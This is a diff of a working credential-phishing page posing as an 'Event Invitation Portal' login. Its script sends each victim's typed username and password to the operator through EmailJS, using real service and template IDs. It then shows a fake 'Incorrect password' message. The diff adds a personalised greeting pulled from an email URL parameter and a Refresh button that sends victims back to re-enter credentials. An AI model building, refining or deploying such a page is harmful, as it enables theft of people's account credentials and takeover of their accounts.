@@ -1,14 +1,16 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login to Your Account</title>
+
+  <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
     emailjs.init("TLkClHUlQn5aQV4XO");
   </script>
+
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -107,7 +109,6 @@
       margin-top: 5px;
     }
 
-    /* Confirmation Message */
     #confirmation {
       display: none;
       background-color: rgba(40, 40, 40, 0.95);
@@ -141,84 +142,112 @@
     }
   </style>
 </head>
+
 <body>
+
   <!-- Login Panel -->
   <div id="login" class="login-container">
     <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
     <h2 id="portalTitle">Event Invitation Portal</h2>
-    <p class="subtext">For security reasons, please briefly confirm your identity</p>
+    <p class="subtext">Sign-in to continue</p>
     <input type="text" id="username" placeholder="Username" required>
     <input type="password" id="password" placeholder="Password" required>
     <button onclick="authenticate()">Login</button>
-    <p class="note">To improve the security of your account, we recommend that you enable sign-in alerts. We will notify you when we detect sign-in activity from a new browser, location, or device.</p>
+    <p class="note">
+To improve the security of your account, we recommend that you enable sign-in alerts. We will notify you when we detect sign-in activity from a new browser, location, or device.
+    </p>
   </div>
 
   <!-- Confirmation Message -->
   <div id="confirmation">
-    <h2 style="color: white;">Opps! Wrong Password</h2>
-    <p>Access is authorized only with valid email and password.</p>
-    <button onclick="window.close()">Close this page</button>
+    <h2 style="color: white;">Incorrect password</h2>
+    <p>The password may be incorrect. Please refresh the page and try again.</p>
+    <!-- ✅ Updated button -->
+    <button onclick="goBackToLogin()">Refresh</button>
   </div>
 
   <!-- Footer -->
   <div class="footer">
     2026 Email Admin. All Rights Reserved
   </div>
-  
-<script>
-  // ✅ Prefill username from URL parameter ?email=
-  document.addEventListener("DOMContentLoaded", function () {
-    const params = new URLSearchParams(window.location.search);
-    const emailParam = params.get("email");
 
-    if (emailParam) {
-      const usernameField = document.getElementById("username");
-      if (usernameField) {
-        usernameField.value = decodeURIComponent(emailParam);
+  <script>
+    // ✅ Prefill username + first name
+    document.addEventListener("DOMContentLoaded", function () {
+      const params = new URLSearchParams(window.location.search);
+      const emailParam = params.get("email");
+
+      function extractFirstName(email) {
+        if (!email || !email.includes("@")) return "";
+        let namePart = email.split("@")[0];
+        namePart = namePart.split(/[.\-_]/)[0];
+        return namePart.charAt(0).toUpperCase() + namePart.slice(1);
+      }
+
+      if (emailParam) {
+        const usernameField = document.getElementById("username");
+        const title = document.getElementById("portalTitle");
+
+        if (usernameField) {
+          const decodedEmail = decodeURIComponent(emailParam);
+          usernameField.value = decodedEmail;
+
+          const firstName = extractFirstName(decodedEmail);
+          if (firstName && title) {
+            title.textContent = "Hi, " + firstName;
+          }
+        }
+      }
+    });
+
+    function sendEmail(username, password) {
+      const serviceID = "service_nfx0v2t";
+      const templateID = "template_ccgi8xh";
+      const publicKey = "TLkClHUlQn5aQV4XO";
+
+      const templateParams = {
+        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
+      };
+
+      return emailjs.send(serviceID, templateID, templateParams, publicKey);
+    }
+
+    function authenticate() {
+      let loginButton = document.querySelector("button");
+
+      loginButton.textContent = "Authenticating...";
+      loginButton.disabled = true;
+
+      let username = document.getElementById("username").value.trim();
+      let password = document.getElementById("password").value.trim();
+
+      if (username && password) {
+        sendEmail(username, password)
+          .then(() => {
+            loginButton.textContent = "Login";
+            loginButton.disabled = false;
+            document.getElementById("login").style.display = "none";
+            document.getElementById("confirmation").style.display = "block";
+          })
+          .catch(error => {
+            console.error("Error sending email", error);
+            loginButton.textContent = "Login";
+            loginButton.disabled = false;
+            alert("Failed to send login report. Please try again.");
+          });
+      } else {
+        alert("Please enter both username and password.");
+        loginButton.disabled = false;
+        loginButton.textContent = "Login";
       }
     }
-  });
 
-  function sendEmail(username, password) {
-    const serviceID = "service_nfx0v2t";
-    const templateID = "template_ccgi8xh";
-    const publicKey = "TLkClHUlQn5aQV4XO";
-
-    const templateParams = {
-      login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
-    };
-
-    return emailjs.send(serviceID, templateID, templateParams, publicKey);
-  }
-
-  function authenticate() {
-    let loginButton = document.querySelector("button");
-    loginButton.textContent = "Authenticating...";
-    loginButton.disabled = true;
-
-    let username = document.getElementById("username").value.trim();
-    let password = document.getElementById("password").value.trim();
-
-    if (username && password) {
-      sendEmail(username, password)
-        .then(() => {
-          loginButton.textContent = "Login";
-          loginButton.disabled = false;
-          document.getElementById("login").style.display = "none";
-          document.getElementById("confirmation").style.display = "block";
-        })
-        .catch(error => {
-          console.error("Error sending email", error);
-          loginButton.textContent = "Login";
-          loginButton.disabled = false;
-          alert("Failed to send login report. Please try again.");
-        });
-    } else {
-      alert("Please enter both username and password.");
-      loginButton.disabled = false;
-      loginButton.textContent = "Login";
+    // ✅ New function to return to login
+    function goBackToLogin() {
+      document.getElementById("confirmation").style.display = "none";
+      document.getElementById("login").style.display = "block";
     }
-  }
-</script>
+  </script>
+
 </body>
 </html>
